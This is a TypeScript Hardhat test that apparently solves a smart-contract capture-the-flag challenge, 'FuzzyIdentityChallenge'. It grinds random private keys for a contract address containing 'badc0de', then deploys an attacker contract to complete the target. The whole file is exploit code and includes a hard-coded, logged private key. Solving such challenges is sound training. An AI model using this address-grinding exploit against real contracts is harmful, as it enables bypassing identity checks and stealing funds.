import { expect } from 'chai';
import { BigNumber, Contract, Wallet } from 'ethers';
import { ethers } from 'hardhat';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import crypto from 'crypto'

function getWallet() {
  let wallet: Wallet;
  let walletPk;
  let contractAddress;

  while (1) {
    walletPk = `0x${crypto.randomBytes(32).toString('hex')}`
    wallet = new ethers.Wallet(walletPk);
    contractAddress = ethers.utils.getContractAddress({ from: wallet.address, nonce: BigNumber.from('0') });

    if (contractAddress.toLowerCase().includes('badc0de')) {
      console.log(walletPk)
      console.log(contractAddress)
      return wallet
    }
  }
}

describe('FuzzyIdentityChallenge', () => {
  let target: Contract;
  let attackerContract: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (await ethers.getContractFactory('FuzzyIdentityChallenge', deployer)).deploy();

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    // const wallet = getWallet()
    const wallet = new Wallet("0xa186be056b9b4eedcdb2fd471ca942e85a5acd7baca4738f145f6a520fc4b10f", ethers.provider)

    attacker.sendTransaction({
      to: wallet!.address,
      value: ethers.utils.parseEther("1")
    })

    attackerContract = await (await ethers.getContractFactory('FuzzyIdentityChallengeAttacker', wallet)).deploy();

    await attackerContract.complete(target.address)

    expect(await target.isComplete()).to.equal(true);
  });
});
